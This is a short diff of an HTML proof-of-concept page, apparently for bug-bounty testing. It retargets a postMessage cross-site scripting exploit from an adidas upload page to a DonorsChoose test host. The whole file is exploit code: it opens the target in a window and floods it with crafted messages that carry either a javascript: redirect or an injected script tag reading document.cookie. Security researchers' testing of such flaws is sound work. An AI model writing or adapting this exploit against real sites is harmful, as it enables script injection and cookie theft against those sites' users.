@@ -1,9 +1,9 @@
 <html>
 <body>
 <script>
-hwin = window.open("https://adifox.adidas.com.cn/ap/#/uploadFile");
+hwin = window.open("https://bugbounty-secure.dctest.donorschoose.org");
 setInterval(function(){
- hwin.postMessage('{"type":"login","redirectUrl":"javascript:alert(document.cookie)"}',"*")
+ hwin.postMessage('{"action":"showScreenAndOverlay","message":"<script>alert(document.cookie)</script>"}',"*")
 },0.00001)
 </script>
 </body>
